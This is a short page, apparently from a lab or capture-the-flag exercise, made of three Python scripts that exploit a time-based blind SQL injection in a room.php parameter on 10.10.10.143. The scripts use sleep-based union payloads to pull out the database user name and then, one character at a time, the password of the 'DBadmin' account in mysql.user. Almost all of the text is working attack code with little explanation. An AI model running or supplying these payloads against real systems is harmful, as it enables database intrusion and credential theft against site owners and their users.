# Exploiting Blind SQL Injection with Python Scripts

### Find Username method #1
```
import requests
import time

strings="abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789_@!"
count=1
username=""
while True:
    for char in strings:
        url = "http://10.10.10.143/room.php?cod=1 union select if(substring(user(),{},1) = '{}',sleep(5),'boo'),null,null,null,null,null,null --".format(count,char)
        start = time.time()
        requests.get(url)
        end = time.time()
        diff = end - start
        if diff > 5 :
            count = count + 1
            username = username + char
            print(username)
            break
```            

### Find Username method #2
```
import requests
import time
#url = "http://10.10.10.143/room.php?cod=1 union select if(substring(user(),1,1) = '{}',sleep(5),'boo'),null,null,null,null,null,null --".format(char)

strings="abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789_@!"
count=1
username=""
while True:
    for char in strings:
        url = "http://10.10.10.143/room.php?cod=1 union select user,null,null,null,null,null,null from mysql.user where if(substring(User,{},1)='{}',sleep(5),'boo')".format(count,char)
        start = time.time()
        requests.get(url)
        end = time.time()
        diff = end - start
        if diff > 5 :
            count = count + 1
            username = username + char
            print(username)
            break
```

### Find Password
```
import requests
import time
#url = "http://10.10.10.143/room.php?cod=1 union select if(substring(user(),1,1) = '{}',sleep(5),'boo'),null,null,null,null,null,null --".format(char)

strings="abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789_@!#$%^&*(){}[]"
count=1
password=""
while True:
    for char in strings:
        url = "http://10.10.10.143/room.php?cod=1 union select user,null,null,null,null,null,null from mysql.user where if(substring(Password,{},1)='{}',sleep(5),'boo') AND User='DBadmin'".format(count,char)
        start = time.time()
        requests.get(url)
        end = time.time()
        diff = end - start
        if diff > 5 :
            count = count + 1
            password = password + char
            print(password)
            break
```
